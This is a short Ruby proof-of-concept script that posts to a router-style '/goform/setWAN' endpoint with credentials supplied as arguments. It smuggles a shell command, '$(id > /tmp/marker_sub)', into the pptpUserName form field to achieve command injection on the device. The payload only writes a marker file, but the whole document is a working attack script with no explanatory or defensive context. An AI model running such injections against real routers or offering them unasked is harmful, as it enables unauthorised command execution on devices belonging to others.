require 'net/http'
uri = URI(ARGV.fetch(0) + '/goform/setWAN')
request = Net::HTTP::Post.new(uri)
request.basic_auth(ARGV.fetch(1), ARGV.fetch(2))
request['Content-Type'] = 'application/x-www-form-urlencoded'
request.body = 'wanMode=3&pptpUserName=$(id > /tmp/marker_sub)&submit-url=/wan.asp'
Net::HTTP.start(uri.hostname, uri.port) { |http| puts http.request(request).code }
